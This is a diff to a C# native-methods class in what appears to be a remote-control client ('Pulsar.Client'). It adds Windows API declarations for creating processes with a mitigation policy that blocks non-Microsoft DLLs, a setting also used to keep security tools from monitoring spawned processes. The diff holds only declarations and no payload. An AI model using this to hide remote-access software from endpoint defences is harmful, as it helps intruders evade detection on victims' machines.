@@ -57,6 +57,94 @@ namespace Pulsar.Client.Utilities
         internal const int STARTF_USEPOSITION = 0x00000004;
         internal const int STARTF_USESHOWWINDOW = 0x00000001;
 
+        // Add these to your existing Pulsar.Client.Utilities.NativeMethods class
+
+        // Process creation flags
+        public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
+
+        // Mitigation policy
+        public const ulong PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
+
+        // Thread attribute
+        public static readonly IntPtr PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = (IntPtr)0x20007;
+
+        // Structures
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public uint dwProcessId;
+            public uint dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFO
+        {
+            public int cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttribute;
+            public uint dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFOEX
+        {
+            public STARTUPINFO StartupInfo;
+            public IntPtr lpAttributeList;
+        }
+
+        // Native methods for process creation with mitigation policies
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool InitializeProcThreadAttributeList(
+            IntPtr lpAttributeList,
+            int dwAttributeCount,
+            int dwFlags,
+            ref IntPtr lpSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool UpdateProcThreadAttribute(
+            IntPtr lpAttributeList,
+            uint dwFlags,
+            IntPtr Attribute,
+            ref ulong lpValue,
+            IntPtr cbSize,
+            IntPtr lpPreviousValue,
+            IntPtr lpReturnSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcess(
+            string lpApplicationName,
+            string lpCommandLine,
+            IntPtr lpProcessAttributes,
+            IntPtr lpThreadAttributes,
+            bool bInheritHandles,
+            uint dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            ref STARTUPINFOEX lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+
 
         /// <summary>
         /// Synthesizes keystrokes, mouse motions, and button clicks.
